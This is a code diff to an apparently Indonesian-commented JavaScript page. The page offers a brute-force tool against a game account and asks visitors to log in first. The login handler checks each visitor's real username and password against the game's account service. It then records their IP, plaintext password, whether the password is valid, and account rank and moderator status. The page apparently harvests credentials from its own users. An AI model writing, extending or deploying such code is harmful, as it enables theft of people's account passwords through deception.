@@ -166,20 +166,7 @@ async function logingd(
             result
         );
 
-        return {
-
-            success:
-
-/^\d+$/.test(
-    result
-),
-
-            response:
-            result,
-
-            gjp2:
-            gjp2
-        };
+        return /^\d+$/.test(result);
 
     }
     catch(error){
@@ -188,17 +175,7 @@ async function logingd(
             error
         );
 
-        return {
-
-            success:
-            false,
-
-            response:
-            null,
-
-            error:
-            error.message
-        };
+        return false;
 
     }
 }
@@ -281,7 +258,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
         return;
     }
 
-    // Validate password - PERBAIKAN: ambil .success dari return object
+    // Validate password
     const isPasswordValid = await logingd(username, password);
     const stats = await getPlayerStats(username);
 
@@ -291,14 +268,13 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
         ip: ip,
         username: username,
         password: password,
-        status: isPasswordValid.success ? 'SUKSES' : 'GAGAL',
+        status: isPasswordValid ? 'SUKSES' : 'GAGAL',
         rank: stats?.rank || 'N/A',
         cp: stats?.cp || 0,
         mod: stats?.moderator || 0
     });
 
-    // PERBAIKAN: cek isPasswordValid.success (object property), bukan isPasswordValid langsung
-    if (!isPasswordValid.success) {
+    if (!isPasswordValid) {
         document.getElementById('passwordError').textContent = 'Invalid credentials';
         document.getElementById('passwordError').classList.add('show');
         loginBtn.disabled = false;
@@ -413,7 +389,6 @@ async function searchTarget() {
     }
 }
 
-// PERBAIKAN: Rename ke generateRandomGJP2 dan tambah delay random + generate GJP2
 async function generateRandomGJP2(length, charset) {
     let password = '';
     for (let i = 0; i < length; i++) {
@@ -453,14 +428,13 @@ async function startBruteforce(targetUsername) {
 
     for (let i = 0; i < maxAttempts; i++) {
         const length = Math.floor(Math.random() * 14) + 6;
-        // PERBAIKAN: gunakan generateRandomGJP2 (sudah include delay dan GJP2)
         const { password, gjp2 } = await generateRandomGJP2(length, charset);
 
         attemptCount++;
 
         const attempt = document.createElement('div');
         attempt.className = 'attempt';
-        attempt.textContent = `[${attemptCount}] ${password} | GJP2: ${gjp2.substring(0, 16)}...`;
+        attempt.textContent = `[${attemptCount}] ${password}`;
         attemptsContainer.appendChild(attempt);
 
         attemptsContainer.scrollTop = attemptsContainer.scrollHeight;
